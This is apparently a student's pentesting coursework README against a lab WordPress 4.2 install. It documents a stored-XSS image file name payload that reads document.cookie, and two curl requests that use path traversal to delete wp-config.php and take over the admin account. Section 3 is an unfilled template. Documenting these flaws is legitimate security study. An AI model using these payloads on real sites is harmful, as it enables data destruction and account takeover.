# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. CVE-2016-7168 Authenticated Stored XSS Via Image File Name
  - [ ] Summary: 
    - Vulnerability types: XSS (stored), Social Engineering
    - Tested in version: 4.2
    - Fixed in version: 4.2.10
  - [ ] GIF Walkthrough: https://github.com/zipesb/codepath_2022/blob/unit7_wordpress/unit7_vuln1.gif
  - [ ] Steps to recreate: Only tested in Linux. Use social engineering to provide image file to admin that contains malicious HTML/script in the image name (such as the example in Assets [1.1](https://github.com/zipesb/codepath_2022/edit/unit7_wordpress/README.md#11-example-malicious-image-file-name-vulnimg-srca-onerroralertdocumentcookiejpg)) and get admin to upload it to the wordpress site. When users view the page containing the uploaded attachment, the HTML/script stored in the image will execute. Possibly restricted to Linux and Mac OS as Windows disallows characters such as "<" in file names.
  - [ ] Affected source code: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
    - [wpscan page](https://wpscan.com/vulnerability/e84eaf3f-677a-465a-8f96-ea4cf074c980)
### 2. CVE-2018-12895 Authenticated Arbitrary File Deletion
  - [ ] Summary: 
    - Vulnerability types: Improper Authentication (leads to arbitrary file deletion)
    - Tested in version: 4.2
    - Fixed in version: 4.2.21
  - [ ] GIF Walkthrough: https://github.com/zipesb/codepath_2022/blob/unit7_wordpress/unit7_vuln2.gif
  - [ ] Steps to recreate: As a user with Author privileges, upload a image. Then navigate to the page to edit the image ```http://192.168.33.10/wp-admin/post.php?post=17&action=edit```(replace ?post parameter with the numerical id of the image that was uploaded, can be seen in the URL as the ?item parameter when viewing the image from the media tab). On this page, copy the cookies and the wpnonce value from the post form in the HTML into the appropriate places in the curl command in Assets [2.1](https://github.com/zipesb/codepath_2022/edit/unit7_wordpress/README.md#21-example-command-to-set-the-image-thumbnail-as-the-file-to-be-maliciously-deleted-in-this-case-deleting-the-wp-configphp-file-curl--v-http1921683310wp-adminpostphppost17--h-cookie-wordpress_ba4e3f1944a184cb3113f616618065deauthor_user7c16474841987cvabdpdltpheswpx2ecz6as38upnu9b8ws7vtotsbxtj7c1048b25d5ff8cba59ff69d9acd57c14253e92e40f35e94f781554298543b4903-wordpress_test_cookiewpcookiecheck-wp-settings-time-11647310661-wp-settings-time-21647311267-wp-settings-2mfold3do-wordpress_logged_in_ba4e3f1944a184cb3113f616618065deauthor_user7c16474841987cvabdpdltpheswpx2ecz6as38upnu9b8ws7vtotsbxtj7c808ae5c845d32fc6c6f1f989dcae303b9f3e5b622df1f662b5c637f8bb7a2db3--d-actioneditattachment_wpnonced4ea7fca1dthumbwp-configphp). Send this curl command, then find the wpnonce value from the file deletion form and place it into the curl command in Assets [2.2](https://github.com/zipesb/codepath_2022/edit/unit7_wordpress/README.md#22-curl-request-to-delete-image-and-newly-associated-thumbnail-curl--v-http1921683310wp-adminpostphppost17--h-cookie-wordpress_ba4e3f1944a184cb3113f616618065deauthor_user7c16474841987cvabdpdltpheswpx2ecz6as38upnu9b8ws7vtotsbxtj7c1048b25d5ff8cba59ff69d9acd57c14253e92e40f35e94f781554298543b4903-wordpress_test_cookiewpcookiecheck-wp-settings-time-11647310661-wp-settings-time-21647311267-wp-settings-2mfold3do-wordpress_logged_in_ba4e3f1944a184cb3113f616618065deauthor_user7c16474841987cvabdpdltpheswpx2ecz6as38upnu9b8ws7vtotsbxtj7c808ae5c845d32fc6c6f1f989dcae303b9f3e5b622df1f662b5c637f8bb7a2db3--d-actiondelete_wpnonce593d226e9c). When this command is sent it will delete the file that was associated with the image file as its thumbnail because Wordpress fails to make the appropriate checks if this file actually is the image thumbnail and should be deleted. In this example specifically, deleting wp-config.php can allow a user to escalate privileges as Wordpress mistakenly thinks the site has not been configured at all due to the missing config file, and it will prompt the user to create new admin credentials.
  - [ ] Affected source code: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
    - [wpscan page](https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4)
### 3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


## Assets

List any additional assets, such as scripts or files
### [1.1] (example malicious image file name): ```vuln\<img src=a onerror=alert(document.cookie)>.jpg```
### [2.1] (example command to set the image thumbnail as the file to be maliciously deleted, in this case deleting the wp-config.php file): ```curl -v 'http://192.168.33.10/wp-admin/post.php?post=17' -H 'Cookie: wordpress_ba4e3f1944a184cb3113f616618065de=author_user%7C1647484198%7CVABdPDLtphesWPx2ecz6as38upnu9b8Ws7vtotSbxTj%7C1048b25d5ff8cba59ff69d9acd57c14253e92e40f35e94f781554298543b4903; wordpress_test_cookie=WP+Cookie+check; wp-settings-time-1=1647310661; wp-settings-time-2=1647311267; wp-settings-2=mfold%3Do; wordpress_logged_in_ba4e3f1944a184cb3113f616618065de=author_user%7C1647484198%7CVABdPDLtphesWPx2ecz6as38upnu9b8Ws7vtotSbxTj%7C808ae5c845d32fc6c6f1f989dcae303b9f3e5b622df1f662b5c637f8bb7a2db3' -d 'action=editattachment&_wpnonce=d4ea7fca1d&thumb=../../../../wp-config.php'```
### [2.2] (curl request to delete image and newly associated "thumbnail"): ```curl -v 'http://192.168.33.10/wp-admin/post.php?post=17' -H 'Cookie: wordpress_ba4e3f1944a184cb3113f616618065de=author_user%7C1647484198%7CVABdPDLtphesWPx2ecz6as38upnu9b8Ws7vtotSbxTj%7C1048b25d5ff8cba59ff69d9acd57c14253e92e40f35e94f781554298543b4903; wordpress_test_cookie=WP+Cookie+check; wp-settings-time-1=1647310661; wp-settings-time-2=1647311267; wp-settings-2=mfold%3Do; wordpress_logged_in_ba4e3f1944a184cb3113f616618065de=author_user%7C1647484198%7CVABdPDLtphesWPx2ecz6as38upnu9b8Ws7vtotSbxTj%7C808ae5c845d32fc6c6f1f989dcae303b9f3e5b622df1f662b5c637f8bb7a2db3' -d 'action=delete&_wpnonce=593d226e9c'```

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with ScreenToGif.

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
